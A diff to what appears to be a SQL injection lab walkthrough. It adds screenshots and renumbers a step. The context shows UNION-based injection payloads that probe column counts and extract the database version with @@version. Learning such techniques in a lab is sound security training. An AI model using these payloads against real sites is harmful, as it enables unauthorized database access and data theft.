@@ -63,22 +63,32 @@ or
 ' order by 2# (upto the time error occurs)
 ```
 
+<img width="1279" height="718" alt="Screenshot 2026-08-04 at 12 04 18 AM" src="https://github.com/user-attachments/assets/bfc166d3-1888-4b66-8419-c7e8c7a50021" />
+
 or
 
 ```
 '+UNION+SELECT+NULL, NULL#
 ```
 
-# Step 4: insert following
+<img width="1278" height="718" alt="Screenshot 2026-08-04 at 12 04 41 AM" src="https://github.com/user-attachments/assets/20e07509-6e20-49ec-b124-3885679ceafc" />
+
+
+# Step 5: Insert following
 
 Now:
 
 ```
 '+UNION+SELECT+'abc','def'#
 ```
+<img width="1275" height="721" alt="Screenshot 2026-08-04 at 12 10 22 AM" src="https://github.com/user-attachments/assets/9449297b-1e21-4f3f-a4b4-d15188094606" />
 
 Next:
 
 ```
 '+UNION+SELECT+@@version,+NULL#
 ```
+<img width="1279" height="739" alt="Screenshot 2026-08-04 at 12 12 21 AM" src="https://github.com/user-attachments/assets/12fb3070-0417-4ec7-813d-98e7ccd6ac48" />
+
+<img width="1275" height="727" alt="Screenshot 2026-08-04 at 12 12 58 AM" src="https://github.com/user-attachments/assets/1e118408-7c9d-407e-b849-32a61cf6d335" />
+
